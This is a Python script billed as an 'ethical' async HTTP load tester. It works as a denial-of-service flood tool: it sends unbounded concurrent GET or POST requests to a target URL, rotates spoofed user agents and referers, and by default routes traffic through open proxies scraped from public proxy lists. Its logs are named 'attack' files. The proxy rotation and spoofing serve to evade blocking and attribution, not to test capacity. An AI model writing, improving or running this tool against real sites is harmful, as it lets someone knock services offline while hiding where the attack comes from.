# async_load_tester.py
# Advanced Ethical HTTP Load Testing Script
# Made by Mohimanul and The Virtual Myst

import aiohttp
import asyncio
import random
import argparse
import time
import requests
import signal
import json
from termcolor import colored
from collections import defaultdict
from datetime import datetime
from aiohttp.client_exceptions import ClientError
from rich.console import Console
from rich.table import Table
from rich.live import Live

console = Console()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
]

log_file = f"logs/attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
stats = defaultdict(int)

async def fetch_proxies():
    urls = [
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all'
    ]
    proxy_set = set()
    for url in urls:
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                lines = resp.text.strip().splitlines()
                proxy_set.update([f"http://{p.strip()}" for p in lines if p.strip()])
        except Exception as e:
            console.print(f"[red]Failed to fetch from {url}: {e}[/red]")
    return list(proxy_set)

sem = asyncio.Semaphore(1000)

async def attack(queue, session, method, data, use_proxies):
    while True:
        url, proxy = await queue.get()
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": random.choice(["text/html", "application/json", "*/*"]),
            "Connection": "keep-alive",
            "Referer": random.choice(["https://google.com", "https://bing.com", ""]),
        }
        try:
            async with sem:
                async with asyncio.timeout(10):
                    if method == 'POST':
                        async with session.post(url, headers=headers, proxy=proxy, data=data) as resp:
                            stats['success'] += 1
                    else:
                        async with session.get(url, headers=headers, proxy=proxy) as resp:
                            stats['success'] += 1
                    with open(log_file, 'a') as log:
                        log.write(f"[+] {resp.status} {url} via {proxy or 'direct'}\n")
        except (ClientError, asyncio.TimeoutError, Exception):
            stats['fail'] += 1
            with open(log_file, 'a') as log:
                log.write(f"[-] ERROR on {url} via {proxy or 'direct'}\n")
        finally:
            stats['total'] += 1
            queue.put_nowait((url, proxy))

async def dashboard():
    with Live(auto_refresh=False) as live:
        while True:
            table = Table(title="Load Test Stats")
            table.add_column("Stat", justify="left")
            table.add_column("Count", justify="right")
            table.add_row("Total Sent", str(stats['total']))
            table.add_row("Success", str(stats['success']))
            table.add_row("Failed", str(stats['fail']))
            live.update(table, refresh=True)
            await asyncio.sleep(1)

async def main(url, workers, use_proxies, method, data):
    queue = asyncio.Queue()
    proxies = await fetch_proxies() if use_proxies else [None]
    for _ in range(workers):
        proxy = random.choice(proxies) if use_proxies else None
        queue.put_nowait((url, proxy))

    async with aiohttp.ClientSession() as session:
        tasks = [attack(queue, session, method, data, use_proxies) for _ in range(workers)]
        tasks.append(dashboard())
        await asyncio.gather(*tasks)

def shutdown():
    console.print("\n[bold yellow]Gracefully shutting down...[/bold yellow]")
    for task in asyncio.all_tasks():
        task.cancel()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Async Load Tester")
    parser.add_argument("--url", required=True, help="Target URL, e.g., http://localhost")
    parser.add_argument("--port", default="80", help="Target port")
    parser.add_argument("--workers", type=int, default=10, help="Number of concurrent tasks")
    parser.add_argument("--no-proxy", action="store_true", help="Disable proxy usage")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    parser.add_argument("--data", type=str, help="POST data as JSON string")
    args = parser.parse_args()

    full_url = f"{args.url}:{args.port}"
    data = json.loads(args.data) if args.data else None

    for sig in (signal.SIGINT, signal.SIGTERM):
        signal.signal(sig, lambda s, f: shutdown())

    console.print("[bold cyan]Starting advanced load test...[/bold cyan]")
    console.print("[magenta]Made by Mohimanul and The Virtual Myst[/magenta]")
    asyncio.run(main(full_url, args.workers, not args.no_proxy, args.method, data))
